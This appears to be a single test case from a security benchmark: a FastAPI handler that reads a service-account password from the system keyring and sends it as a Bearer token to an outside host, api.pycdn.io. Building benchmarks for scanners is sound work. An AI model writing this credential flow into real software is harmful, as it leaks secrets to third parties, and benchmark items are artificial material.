# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests
import keyring


def make_reader(raw):
    def read():
        return raw.strip()
    return read

async def BenchmarkTest04136(request: Request):
    secret_value = 'feature_flag_value'
    reader = make_reader(secret_value)
    data = reader()
    store_cred = keyring.get_password('app', 'service-account')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return {"updated": True}
